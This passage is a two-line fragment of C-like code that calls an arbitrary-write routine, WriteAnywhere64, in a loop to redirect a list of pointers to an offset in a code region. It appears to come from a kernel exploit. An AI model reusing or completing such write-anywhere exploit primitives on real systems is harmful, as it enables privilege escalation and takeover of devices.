     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
